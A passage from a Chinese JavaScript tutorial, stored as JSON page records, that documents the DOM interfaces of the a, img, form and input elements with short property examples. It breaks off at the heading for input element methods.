线程。</li>\n<li>self.postMessage()：向产生这个 Worker 线程发送消息。</li>\n<li>self.importScripts()：加载 JS 脚本。</li>\n</ul>\n<p>（完）</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"附录：网页元素接口","link":"javascript:void(0)"},{"title":"a 元素","link":"/elements/a.html"}],"content":"\n        <h1>\n            <a href='#a-元素' class='header-anchor'>#</a>\n            <span>a 元素</span>\n        </h1>\n    <p><code>&lt;a&gt;</code>元素用来设置链接。除了网页元素的通用接口（<code>Node</code>接口、<code>Element</code>接口、<code>HTMLElement</code>接口），它还继承了<code>HTMLAnchorElement</code>接口和<code>HTMLHyperlinkElementUtils</code>接口。</p>\n\n        <h2>\n            <a href='#属性' class='header-anchor'>#</a>\n            <span>属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#URL-相关属性' class='header-anchor'>#</a>\n            <span>URL 相关属性</span>\n        </h3>\n    <p><code>&lt;a&gt;</code>元素有一系列 URL 相关属性，可以用来操作链接地址。这些属性的含义，可以参见<code>Location</code>对象的实例属性。</p>\n<ul>\n<li>hash：片段识别符（以<code>#</code>开头）</li>\n<li>host：主机和端口（默认端口80和443会省略）</li>\n<li>hostname：主机名</li>\n<li>href：完整的 URL</li>\n<li>origin：协议、域名和端口</li>\n<li>password：主机名前的密码</li>\n<li>pathname：路径（以<code>/</code>开头）</li>\n<li>port：端口</li>\n<li>protocol：协议（包含尾部的冒号<code>:</code>）</li>\n<li>search：查询字符串（以<code>?</code>开头）</li>\n<li>username：主机名前的用户名</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;http://user:passed@example.com:8081/index.html?bar=1#foo&quot;&gt;test&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.hash // &quot;#foo&quot;\na.host // &quot;example.com:8081&quot;\na.hostname // &quot;example.com&quot;\na.href // &quot;http://user:passed@example.com:8081/index.html?bar=1#foo&quot;\na.origin // &quot;http://example.com:8081&quot;\na.password // &quot;passwd&quot;\na.pathname // &quot;/index.html&quot;\na.port // &quot;8081&quot;\na.protocol // &quot;http:&quot;\na.search // &quot;?bar=1&quot;\na.username // &quot;user&quot;</code></pre><p>除了<code>origin</code>属性是只读的，上面这些属性都是可读写的。</p>\n\n        <h3>\n            <a href='#accessKey-属性' class='header-anchor'>#</a>\n            <span>accessKey 属性</span>\n        </h3>\n    <p><code>accessKey</code>属性用来读写<code>&lt;a&gt;</code>元素的快捷键。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;http://example.com&quot;&gt;test&lt;/a&gt;\nvar a = document.getElementById(&#039;a&#039;);\na.accessKey = &#039;k&#039;;</code></pre><p>上面代码设置<code>&lt;a&gt;</code>元素的快捷键为<code>k</code>，以后只要按下这个快捷键，浏览器就会跳转到<code>example.com</code>。</p>\n<p>注意，不同的浏览器在不同的操作系统下，唤起快捷键的功能键组合是<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey\">不一样</a>的。比如，Chrome 浏览器在 Linux 系统下，需要按下<code>Alt + k</code>，才会跳转到<code>example.com</code>。</p>\n\n        <h3>\n            <a href='#download-属性' class='header-anchor'>#</a>\n            <span>download 属性</span>\n        </h3>\n    <p><code>download</code>属性表示当前链接不是用来浏览，而是用来下载的。它的值是一个字符串，表示用户下载得到的文件名。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;foo.jpg&quot;&gt;下载&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.download = &#039;bar.jpg&#039;;</code></pre><p>上面代码中，<code>&lt;a&gt;</code>元素是一个图片链接，默认情况下，点击后图片会在当前窗口加载。设置了<code>download</code>属性以后，再点击这个链接，就会下载对话框，询问用户保存位置，而且下载的文件名为<code>bar.jpg</code>。</p>\n\n        <h3>\n            <a href='#hreflang-属性' class='header-anchor'>#</a>\n            <span>hreflang 属性</span>\n        </h3>\n    <p><code>hreflang</code>属性用来读写<code>&lt;a&gt;</code>元素的 HTML 属性<code>hreflang</code>，表示链接指向的资源的语言，比如<code>hreflang=&quot;en&quot;</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;https://example.com&quot; hreflang=&quot;en&quot;&gt;test&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.hreflang // &quot;en&quot;</code></pre>\n        <h3>\n            <a href='#referrerPolicy-属性' class='header-anchor'>#</a>\n            <span>referrerPolicy 属性</span>\n        </h3>\n    <p><code>referrerPolicy</code>属性用来读写<code>&lt;a&gt;</code>元素的 HTML 属性<code>referrerPolicy</code>，指定当用户点击链接时，如何发送 HTTP 头信息的<code>referer</code>字段。</p>\n<p>HTTP 头信息的<code>referer</code>字段，表示当前请求是从哪里来的。它的格式可以由<code>&lt;a&gt;</code>元素的<code>referrerPolicy</code>属性指定，共有三个值可以选择。</p>\n<ul>\n<li><code>no-referrer</code>：不发送<code>referer</code>字段。</li>\n<li><code>origin</code>：<code>referer</code>字段的值是<code>&lt;a&gt;</code>元素的<code>origin</code>属性，即协议 + 主机名 + 端口。</li>\n<li><code>unsafe-url</code>：<code>referer</code>字段的值是<code>origin</code>属性再加上路径，但不包含<code>#</code>片段。这种格式提供的信息最详细，可能存在信息泄漏的风险。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;https://example.com&quot; referrerpolicy=&quot;no-referrer&quot;&gt;test&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.referrerPolicy // &quot;no-referrer&quot;</code></pre>\n        <h3>\n            <a href='#rel-属性' class='header-anchor'>#</a>\n            <span>rel 属性</span>\n        </h3>\n    <p><code>rel</code>属性用来读写<code>&lt;a&gt;</code>元素的 HTML 属性<code>rel</code>，表示链接与当前文档的关系。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;https://example.com&quot; rel=&quot;license&quot;&gt;license.html&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.rel // &quot;license&quot;</code></pre>\n        <h3>\n            <a href='#tabIndex-属性' class='header-anchor'>#</a>\n            <span>tabIndex 属性</span>\n        </h3>\n    <p><code>tabIndex</code>属性的值是一个整数，用来读写当前<code>&lt;a&gt;</code>元素在文档里面的 Tab 键遍历顺序。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;https://example.com&quot;&gt;test&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.tabIndex // 0</code></pre>\n        <h3>\n            <a href='#target-属性' class='header-anchor'>#</a>\n            <span>target 属性</span>\n        </h3>\n    <p><code>target</code>属性用来读写<code>&lt;a&gt;</code>元素的 HTML 属性<code>target</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;https://example.com&quot; target=&quot;_blank&quot;&gt;test&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.target // &quot;_blank&quot;</code></pre>\n        <h3>\n            <a href='#text-属性' class='header-anchor'>#</a>\n            <span>text 属性</span>\n        </h3>\n    <p><code>text</code>属性用来读写<code>&lt;a&gt;</code>元素的链接文本，等同于当前节点的<code>textContent</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; href=&quot;https://example.com&quot;&gt;test&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.text // &quot;test&quot;</code></pre>\n        <h3>\n            <a href='#type-属性' class='header-anchor'>#</a>\n            <span>type 属性</span>\n        </h3>\n    <p><code>type</code>属性用来读写<code>&lt;a&gt;</code>元素的 HTML 属性<code>type</code>，表示链接目标的 MIME 类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;a id=&quot;test&quot; type=&quot;video/mp4&quot; href=&quot;example.mp4&quot;&gt;video&lt;/a&gt;\nvar a = document.getElementById(&#039;test&#039;);\na.type // &quot;video/mp4&quot;</code></pre>\n        <h2>\n            <a href='#方法' class='header-anchor'>#</a>\n            <span>方法</span>\n        </h2>\n    <p><code>&lt;a&gt;</code>元素的方法都是继承的，主要有以下三个。</p>\n<ul>\n<li><code>blur()</code>：从当前元素移除键盘焦点，详见<code>HTMLElement</code>接口的介绍。</li>\n<li><code>focus()</code>：当前元素得到键盘焦点，详见<code>HTMLElement</code>接口的介绍。</li>\n<li><code>toString()</code>：返回当前<code>&lt;a&gt;</code>元素的 HTML 属性<code>href</code>。</li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"附录：网页元素接口","link":"javascript:void(0)"},{"title":"img 元素","link":"/elements/image.html"}],"content":"\n        <h1>\n            <a href='#img-元素' class='header-anchor'>#</a>\n            <span>img 元素</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>&lt;img&gt;</code>元素用于插入图片，主要继承了 HTMLImageElement 接口。</p>\n<p>浏览器提供一个原生构造函数<code>Image</code>，用于生成<code>HTMLImageElement</code>实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var img = new Image();\nimg instanceof Image // true\nimg instanceof HTMLImageElement // true</code></pre><p><code>Image</code>构造函数可以接受两个整数作为参数，分别表示<code>&lt;img&gt;</code>元素的宽度和高度。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 语法\nImage(width, height)\n\n// 用法\nvar myImage = new Image(100, 200);</code></pre><p><code>&lt;img&gt;</code>实例的<code>src</code>属性可以定义图像的网址。</p>\n<pre class=\"prettyprint language-javascript\"><code>var img = new Image();\nimg.src = &#039;picture.jpg&#039;;</code></pre><p>新生成的<code>&lt;img&gt;</code>实例并不属于文档的一部分。如果想让它显示在文档中，必须手动插入文档。</p>\n<pre class=\"prettyprint language-javascript\"><code>var img = new Image();\nimg.src = &#039;image1.png&#039;;\ndocument.body.appendChild(img);</code></pre><p>除了使用<code>Image</code>构造，下面的方法也可以得到<code>HTMLImageElement</code>实例。</p>\n<ul>\n<li><code>document.images</code>的成员</li>\n<li>节点选取方法（比如<code>document.getElementById</code>）得到的<code>&lt;img&gt;</code>节点</li>\n<li><code>document.createElement(&#39;img&#39;)</code>生成的<code>&lt;img&gt;</code>节点</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>document.images[0] instanceof HTMLImageElement\n// true\n\nvar img = document.getElementById(&#039;myImg&#039;);\nimg instanceof HTMLImageElement\n// true\n\nvar img = document.createElement(&#039;img&#039;);\nimg instanceof HTMLImageElement\n// true</code></pre><p><code>HTMLImageElement</code>实例除了具有 Node、Element、HTMLElement 接口以外，还拥有一些独有的属性。这个接口没有定义自己的方法。</p>\n\n        <h2>\n            <a href='#特性相关的属性' class='header-anchor'>#</a>\n            <span>特性相关的属性</span>\n        </h2>\n    <p><strong>（1）HTMLImageElement.src</strong></p>\n<p><code>HTMLImageElement.src</code>属性返回图像的完整网址。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;img width=&quot;300&quot; height=&quot;400&quot; id=&quot;myImg&quot; src=&quot;http://example.com/pic.jpg&quot;&gt;\nvar img = document.getElementById(&#039;img&#039;);\nimg.src // http://example.com/pic.jpg</code></pre><p><strong>（2）HTMLImageElement.currentSrc</strong></p>\n<p><code>HTMLImageElement.currentSrc</code>属性返回当前正在展示的图像的网址。JavaScript 和 CSS 的 mediaQuery 都可能改变正在展示的图像。</p>\n<p><strong>（3）HTMLImageElement.alt</strong></p>\n<p><code>HTMLImageElement.alt</code>属性可以读写<code>&lt;img&gt;</code>的 HTML 属性<code>alt</code>，表示对图片的文字说明。</p>\n<p><strong>（4）HTMLImageElement.isMap，HTMLImageElement.useMap</strong></p>\n<p><code>HTMLImageElement.isMap</code>属性对应<code>&lt;img&gt;</code>元素的 HTML 属性<code>ismap</code>，返回一个布尔值，表示图像是否为服务器端的图像映射的一部分。</p>\n<p><code>HTMLImageElement.useMap</code>属性对应<code>&lt;img&gt;</code>元素的 HTML 属性<code>usemap</code>，表示当前图像对应的<code>&lt;map&gt;</code>元素。</p>\n<p><strong>（5）HTMLImageElement.srcset，HTMLImageElement.sizes</strong></p>\n<p><code>HTMLImageElement.srcset</code>属性和<code>HTMLImageElement.sizes</code>属性，分别用于读写<code>&lt;img&gt;</code>元素的<code>srcset</code>属性和<code>sizes</code>属性。它们用于<code>&lt;img&gt;</code>元素的响应式加载。<code>srcset</code>属性可以单独使用，但是<code>sizes</code>属性必须与<code>srcset</code>属性同时使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;img srcset=&quot;example-320w.jpg 320w,\n//              example-480w.jpg 480w,\n//              example-800w.jpg 800w&quot;\n//      sizes=&quot;(max-width: 320px) 280px,\n//             (max-width: 480px) 440px,\n//             800px&quot;\n//      id=&quot;myImg&quot;\n//      src=&quot;example-800w.jpg&quot;&gt;\nvar img = document.getElementById(&#039;myImg&#039;);\nimg.srcset\n// &quot;example-320w.jpg 320w,\n//  example-480w.jpg 480w,\n//  example-800w.jpg 800w&quot;\n\nimg.sizes\n// &quot;(max-width: 320px) 280px,\n//  (max-width: 480px) 440px,\n//  800px&quot;</code></pre><p>上面代码中，<code>sizes</code>属性指定，对于小于<code>320px</code>的屏幕，图像的宽度为<code>280px</code>；对于小于<code>480px</code>的屏幕，图像宽度为<code>440px</code>；其他情况下，图像宽度为<code>800px</code>。然后，浏览器会根据当前屏幕下的图像宽度，到<code>srcset</code>属性加载宽度最接近的图像。</p>\n\n        <h2>\n            <a href='#HTMLImageElement.width，HTMLImageElement.height' class='header-anchor'>#</a>\n            <span>HTMLImageElement.width，HTMLImageElement.height</span>\n        </h2>\n    <p><code>width</code>属性表示<code>&lt;img&gt;</code>的 HTML 宽度，<code>height</code>属性表示高度。这两个属性返回的都是整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;img width=&quot;300&quot; height=&quot;400&quot; id=&quot;myImg&quot; src=&quot;pic.jpg&quot;&gt;\nvar img = document.getElementById(&#039;img&#039;);\nimg.width // 300\nimg.height // 400</code></pre><p>如果图像还没有加载，这两个属性返回的都是<code>0</code>。</p>\n<p>如果 HTML 代码没有设置<code>width</code>和<code>height</code>属性，则它们返回的是图像的实际宽度和高度，即<code>HTMLImageElement.naturalWidth</code>属性和<code>HTMLImageElement.naturalHeight</code>属性。</p>\n\n        <h2>\n            <a href='#HTMLImageElement.naturalWidth，HTMLImageElement.naturalHeight' class='header-anchor'>#</a>\n            <span>HTMLImageElement.naturalWidth，HTMLImageElement.naturalHeight</span>\n        </h2>\n    <p><code>HTMLImageElement.naturalWidth</code>属性表示图像的实际宽度（单位像素），<code>HTMLImageElement.naturalHeight</code>属性表示实际高度。这两个属性返回的都是整数。</p>\n<p>如果图像还没有指定或不可得，这两个属性都等于<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var img = document.getElementById(&#039;img&#039;);\nif (img.naturalHeight &gt; img.naturalWidth) {\n  img.classList.add(&#039;portrait&#039;);\n}</code></pre><p>上面代码中，如果图片的高度大于宽度，则设为<code>portrait</code>模式。</p>\n\n        <h2>\n            <a href='#HTMLImageElement.complete' class='header-anchor'>#</a>\n            <span>HTMLImageElement.complete</span>\n        </h2>\n    <p><code>HTMLImageElement.complete</code>属性返回一个布尔值，表示图表是否已经加载完成。如果<code>&lt;img&gt;</code>元素没有<code>src</code>属性，也会返回<code>true</code>。</p>\n\n        <h2>\n            <a href='#HTMLImageElement.crossOrigin' class='header-anchor'>#</a>\n            <span>HTMLImageElement.crossOrigin</span>\n        </h2>\n    <p><code>HTMLImageElement.crossOrigin</code>属性用于读写<code>&lt;img&gt;</code>元素的<code>crossorigin</code>属性，表示跨域设置。</p>\n<p>这个属性有两个可能的值。</p>\n<ul>\n<li><code>anonymous</code>：跨域请求不要求用户身份（credentials），这是默认值。</li>\n<li><code>use-credentials</code>：跨域请求要求用户身份。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;img crossorigin=&quot;anonymous&quot; id=&quot;myImg&quot; src=&quot;pic.jpg&quot;&gt;\nvar img = document.getElementById(&#039;img&#039;);\nimg.crossOrigin // &quot;anonymous&quot;</code></pre>\n        <h2>\n            <a href='#HTMLImageElement.referrerPolicy' class='header-anchor'>#</a>\n            <span>HTMLImageElement.referrerPolicy</span>\n        </h2>\n    <p><code>HTMLImageElement.referrerPolicy</code>用来读写<code>&lt;img&gt;</code>元素的 HTML 属性<code>referrerpolicy</code>，表示请求图像资源时，如何处理 HTTP 请求的<code>referrer</code>字段。</p>\n<p>它有五个可能的值。</p>\n<ul>\n<li><code>no-referrer</code>：不带有<code>referrer</code>字段。</li>\n<li><code>no-referrer-when-downgrade</code>：如果请求的地址不是 HTTPS 协议，就不带有<code>referrer</code>字段，这是默认值。</li>\n<li><code>origin</code>：<code>referrer</code>字段是当前网页的地址，包含协议、域名和端口。</li>\n<li><code>origin-when-cross-origin</code>：如果请求的地址与当前网页是同源关系，那么<code>referrer</code>字段将带有完整路径，否则将只包含协议、域名和端口。</li>\n<li><code>unsafe-url</code>：<code>referrer</code>字段包含当前网页的地址，除了协议、域名和端口以外，还包括路径。这个设置是不安全的，因为会泄漏路径信息。</li>\n</ul>\n\n        <h2>\n            <a href='#HTMLImageElement.x，HTMLImageElement.y' class='header-anchor'>#</a>\n            <span>HTMLImageElement.x，HTMLImageElement.y</span>\n        </h2>\n    <p><code>HTMLImageElement.x</code>属性返回图像左上角相对于页面左上角的横坐标，<code>HTMLImageElement.y</code>属性返回纵坐标。</p>\n\n        <h2>\n            <a href='#事件属性' class='header-anchor'>#</a>\n            <span>事件属性</span>\n        </h2>\n    <p>图像加载完成，会触发<code>onload</code>属性指定的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为 &lt;img src=&quot;example.jpg&quot; onload=&quot;loadImage()&quot;&gt;\nfunction loadImage() {\n  console.log(&#039;Image is loaded&#039;);\n}</code></pre><p>图像加载完成，会触发<code>onerror</code>属性指定的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为 &lt;img src=&quot;image.gif&quot; onerror=&quot;myFunction()&quot;&gt;\nfunction myFunction() {\n  console.log(&#039;There is something wrong&#039;);\n}</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"附录：网页元素接口","link":"javascript:void(0)"},{"title":"form 元素","link":"/elements/form.html"}],"content":"\n        <h1>\n            <a href='#form-元素' class='header-anchor'>#</a>\n            <span>form 元素</span>\n        </h1>\n    <p><code>&lt;form&gt;</code>元素代表了表单，继承了 HTMLFormElement 接口。</p>\n\n        <h2>\n            <a href='#HTMLFormElement-的实例属性' class='header-anchor'>#</a>\n            <span>HTMLFormElement 的实例属性</span>\n        </h2>\n    <ul>\n<li><code>elements</code>：返回一个类似数组的对象，成员是属于该表单的所有控件元素。该属性只读。</li>\n<li><code>length</code>：返回一个整数，表示属于该表单的控件数量。该属性只读。</li>\n<li><code>name</code>：字符串，表示该表单的名称。</li>\n<li><code>method</code>：字符串，表示提交给服务器时所使用的 HTTP 方法。</li>\n<li><code>target</code>：字符串，表示表单提交后，服务器返回的数据的展示位置。</li>\n<li><code>action</code>：字符串，表示表单提交数据的 URL。</li>\n<li><code>enctype</code>（或<code>encoding</code>）：字符串，表示表单提交数据的编码方法，可能的值有<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>和<code>text/plain</code>。</li>\n<li><code>acceptCharset</code>：字符串，表示服务器所能接受的字符编码，多个编码格式之间或空格分隔。</li>\n<li><code>autocomplete</code>：字符串<code>on</code>或<code>off</code>，表示浏览器是否要对<code>&lt;input&gt;</code>控件提供自动补全。</li>\n<li><code>noValidate</code>：布尔值，表示是否关闭表单的自动校验。</li>\n</ul>\n\n        <h2>\n            <a href='#HTMLFormElement-的实例方法' class='header-anchor'>#</a>\n            <span>HTMLFormElement 的实例方法</span>\n        </h2>\n    <ul>\n<li><code>submit()</code>：提交表单，但是不会触发<code>submit</code>事件和表单的自动校验。</li>\n<li><code>reset()</code>：重置表单控件的值为默认值。</li>\n<li><code>checkValidity()</code>：如果控件能够通过自动校验，返回<code>true</code>，否则返回<code>false</code>，同时触发<code>invalid</code>事件。</li>\n</ul>\n<p>下面是一个创建表单并提交的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = document.createElement(&#039;form&#039;);\ndocument.body.appendChild(f);\nf.action = &#039;/cgi-bin/some.cgi&#039;;\nf.method = &#039;POST&#039;;\nf.submit();</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"附录：网页元素接口","link":"javascript:void(0)"},{"title":"input 元素","link":"/elements/input.html"}],"content":"\n        <h1>\n            <a href='#input-元素' class='header-anchor'>#</a>\n            <span>input 元素</span>\n        </h1>\n    <p><code>&lt;input&gt;</code>元素主要用于表单组件，它继承了 HTMLInputElement 接口。</p>\n\n        <h2>\n            <a href='#HTMLInputElement-的实例属性' class='header-anchor'>#</a>\n            <span>HTMLInputElement 的实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#特征属性' class='header-anchor'>#</a>\n            <span>特征属性</span>\n        </h3>\n    <ul>\n<li><code>name</code>：字符串，表示<code>&lt;input&gt;</code>节点的名称。该属性可读写。</li>\n<li><code>type</code>：字符串，表示<code>&lt;input&gt;</code>节点的类型。该属性可读写。</li>\n<li><code>disabled</code>：布尔值，表示<code>&lt;input&gt;</code>节点是否禁止使用。一旦被禁止使用，表单提交时不会包含该<code>&lt;input&gt;</code>节点。该属性可读写。</li>\n<li><code>autofocus</code>：布尔值，表示页面加载时，该元素是否会自动获得焦点。该属性可读写。</li>\n<li><code>required</code>：布尔值，表示表单提交时，该<code>&lt;input&gt;</code>元素是否必填。该属性可读写。</li>\n<li><code>value</code>：字符串，表示该<code>&lt;input&gt;</code>节点的值。该属性可读写。</li>\n<li><code>validity</code>：返回一个<code>ValidityState</code>对象，表示<code>&lt;input&gt;</code>节点的校验状态。该属性只读。</li>\n<li><code>validationMessage</code>：字符串，表示该<code>&lt;input&gt;</code>节点的校验失败时，用户看到的报错信息。如果该节点不需要校验，或者通过校验，该属性为空字符串。该属性只读。</li>\n<li><code>willValidate</code>：布尔值，表示表单提交时，该<code>&lt;input&gt;</code>元素是否会被校验。该属性只读。</li>\n</ul>\n\n        <h3>\n            <a href='#表单相关属性' class='header-anchor'>#</a>\n            <span>表单相关属性</span>\n        </h3>\n    <ul>\n<li><code>form</code>：返回<code>&lt;input&gt;</code>元素所在的表单（<code>&lt;form&gt;</code>）节点。该属性只读。</li>\n<li><code>formAction</code>：字符串，表示表单提交时的服务器目标。该属性可读写，一旦设置了这个属性，会覆盖表单元素的<code>action</code>属性。</li>\n<li><code>formEncType</code>：字符串，表示表单提交时数据的编码方式。该属性可读写，一旦设置了这个属性，会覆盖表单元素的<code>enctype</code>的属性。</li>\n<li><code>formMethod</code>：字符串，表示表单提交时的 HTTP 方法。该属性可读写，一旦设置了这个属性，会覆盖表单元素的<code>method</code>属性。</li>\n<li><code>formNoValidate</code>：布尔值，表示表单提交时，是否要跳过校验。该属性可读写，一旦设置了这个属性，会覆盖表单元素的<code>formNoValidate</code>属性。</li>\n<li><code>formTarget</code>：字符串，表示表单提交后，服务器返回数据的打开位置。该属性可读写，一旦设置了这个属性，会覆盖表单元素的<code>target</code>属性。</li>\n</ul>\n\n        <h3>\n            <a href='#文本输入框的特有属性' class='header-anchor'>#</a>\n            <span>文本输入框的特有属性</span>\n        </h3>\n    <p>以下属性只有在<code>&lt;input&gt;</code>元素可以输入文本时才有效。</p>\n<ul>\n<li><code>autocomplete</code>：字符串<code>on</code>或<code>off</code>，表示该<code>&lt;input&gt;</code>节点的输入内容可以被浏览器自动补全。该属性可读写。</li>\n<li><code>maxLength</code>：整数，表示可以输入的字符串最大长度。如果设为负整数，会报错。该属性可读写。</li>\n<li><code>size</code>：整数，表示<code>&lt;input&gt;</code>节点的显示长度。如果类型是<code>text</code>或<code>password</code>，该属性的单位是字符个数，否则单位是像素。该属性可读写。</li>\n<li><code>pattern</code>：字符串，表示<code>&lt;input&gt;</code>节点的值应该满足的正则表达式。该属性可读写。</li>\n<li><code>placeholder</code>：字符串，表示该<code>&lt;input&gt;</code>节点的占位符，作为对元素的提示。该字符串不能包含回车或换行。该属性可读写。</li>\n<li><code>readOnly</code>：布尔值，表示用户是否可以修改该节点的值。该属性可读写。</li>\n<li><code>min</code>：字符串，表示该节点的最小数值或日期，且不能大于<code>max</code>属性。该属性可读写。</li>\n<li><code>max</code>：字符串，表示该节点的最大数值或日期，且不能小于<code>min</code>属性。该属性可读写。</li>\n<li><code>selectionStart</code>：整数，表示选中文本的起始位置。如果没有选中文本，返回光标在<code>&lt;input&gt;</code>元素内部的位置。该属性可读写。</li>\n<li><code>selectionEnd</code>：整数，表示选中文本的结束位置。如果没有选中文本，返回光标在<code>&lt;input&gt;</code>元素内部的位置。该属性可读写。- <code>selectionDirection</code>：字符串，表示选中文本的方向。可能的值包括<code>forward</code>（与文字书写方向一致）、<code>backward</code>（与文字书写方向相反）和<code>none</code>（文字方向未知）。该属性可读写。</li>\n</ul>\n\n        <h3>\n            <a href='#复选框和单选框的特有属性' class='header-anchor'>#</a>\n            <span>复选框和单选框的特有属性</span>\n        </h3>\n    <p>如果<code>&lt;input&gt;</code>元素的类型是复选框（checkbox）或单选框（radio），会有下面的特有属性。</p>\n<ul>\n<li><code>checked</code>：布尔值，表示该<code>&lt;input&gt;</code>元素是否选中。该属性可读写。</li>\n<li><code>defaultChecked</code>：布尔值，表示该<code>&lt;input&gt;</code>元素默认是否选中。该属性可读写。</li>\n<li><code>indeterminate</code>：布尔值，表示该<code>&lt;input&gt;</code>元素是否还没有确定的状态。一旦用户点击过一次，该属性就会变成<code>false</code>，表示用户已经给出确定的状态了。该属性可读写。</li>\n</ul>\n\n        <h3>\n            <a href='#图像按钮的特有属性' class='header-anchor'>#</a>\n            <span>图像按钮的特有属性</span>\n        </h3>\n    <p>如果<code>&lt;input&gt;</code>元素的类型是<code>image</code>，就会变成一个图像按钮，会有下面的特有属性。</p>\n<ul>\n<li><code>alt</code>：字符串，图像无法显示时的替代文本。该属性可读写。</li>\n<li><code>height</code>：字符串，表示该元素的高度（单位像素）。该属性可读写。</li>\n<li><code>src</code>：字符串，表示该元素的图片来源。该属性可读写。</li>\n<li><code>width</code>：字符串，表示该元素的宽度（单位像素）。该属性可读写。</li>\n</ul>\n\n        <h3>\n            <a href='#文件上传按钮的特有属性' class='header-anchor'>#</a>\n            <span>文件上传按钮的特有属性</span>\n        </h3>\n    <p>如果<code>&lt;input&gt;</code>元素的类型是<code>file</code>，就会变成一个文件上传按钮，会有下面的特有属性。</p>\n<ul>\n<li><code>accept</code>：字符串，表示该元素可以接受的文件类型，类型之间使用逗号分隔。该属性可读写。</li>\n<li><code>files</code>：返回一个<code>FileList</code>实例对象，包含了选中上传的一组<code>File</code>实例对象。</li>\n</ul>\n\n        <h3>\n            <a href='#其他属性' class='header-anchor'>#</a>\n            <span>其他属性</span>\n        </h3>\n    <ul>\n<li><code>defaultValue</code>：字符串，表示该<code>&lt;input&gt;</code>节点的原始值。</li>\n<li><code>dirName</code>：字符串，表示文字方向。</li>\n<li><code>accessKey</code>：字符串，表示让该<code>&lt;input&gt;</code>节点获得焦点的某个字母键。</li>\n<li><code>list</code>：返回一个<code>&lt;datalist&gt;</code>节点，该节点必须绑定<code>&lt;input&gt;</code>元素，且<code>&lt;input&gt;</code>元素的类型必须可以输入文本，否则无效。该属性只读。</li>\n<li><code>multiple</code>：布尔值，表示是否可以选择多个值。</li>\n<li><code>labels</code>：返回一个<code>NodeList</code>实例，代表绑定当前<code>&lt;input&gt;</code>节点的<code>&lt;label&gt;</code>元素。该属性只读。</li>\n<li><code>step</code>：字符串，表示在<code>min</code>属性到<code>max</code>属性之间，每次递增或递减时的数值或时间。</li>\n<li><code>valueAsDate</code>：<code>Date</code>实例，一旦设置，该<code>&lt;input&gt;</code>元素的值会被解释为指定的日期。如果无法解析该属性的值，<code>&lt;input&gt;</code>节点的值将是<code>null</code>。</li>\n<li><code>valueAsNumber</code>：浮点数，当前<code>&lt;input&gt;</code>元素的值会被解析为这个数值。</li>\n</ul>\n\n        <h2>\n            <a href='#HTMLInputElement-的实例方法' class='header-anchor'>#</a>\n            <span>HTMLInputElement 的实例方法</span>\n        </h2>\n    